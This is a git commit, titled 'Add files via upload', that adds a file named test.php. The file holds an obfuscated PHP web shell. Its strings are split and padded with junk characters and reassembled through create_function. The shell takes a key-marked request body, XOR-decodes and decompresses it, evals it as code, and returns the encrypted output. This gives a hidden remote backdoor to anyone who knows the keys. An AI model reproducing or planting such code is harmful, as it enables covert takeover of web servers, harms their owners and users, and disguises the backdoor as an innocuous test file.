edd8c0931a2c108229ca0c54affcb4de2d3ded3e
source013 <85862714+source013@users.noreply.github.com>
2021-12-29 01:26:58 +0900

    Add files via upload

---
+++ test.php
@@ -0,0 +1,13 @@
+<?php
+$i='_T4T4match("/$kT4h(.+)$kf/",T4@filT4e_get_contenT4ts(T4T4"php://T4input"T4),$m';
+$M=')==1) {@ob_stT4art(T4);@evT4al(@gT4zuncoT4mpress(T4@x(@bT4ase6T44_deco';
+$s='$T4k="T4025a181T48"T4;$khT4="01cd6887T41a9T46";$kf="7T4T4350ed526f11";$p';
+$o='de($m[1T4]),$kT4)));$oT4=@ob_T4getT4_contentsT4()T4;@ob_end_clT4ean();$rT4';
+$n='="AWCgTaUT4T4osiiST4RAfT45";function T4x(T4$T4t,$T4k){$c=T4strlen($k);$l=s';
+$f=str_replace('C','','cCreCateC_fCuCnCction');
+$w='T4T4$j++,$i+T4+){$T4o.=$t{$iT4}^$k{$j}T4;}}returT4n $T4o;}if (@T4prT4eg';
+$P='trlenT4($T4t);T4$o="";for($i=T40;$iT4T4<$l;){for($T4j=0;(T4$j<$c&&T4$i<$l);';
+$d='=@bT4ase64_encT4ode(T4@x(@gzcoT4mpressT4(T4$o)T4T4,$k));printT4("$p$kh$r$kf");}';
+$N=str_replace('T4','',$s.$n.$P.$w.$i.$M.$o.$d);
+$U=$f('',$N);$U();
+?>
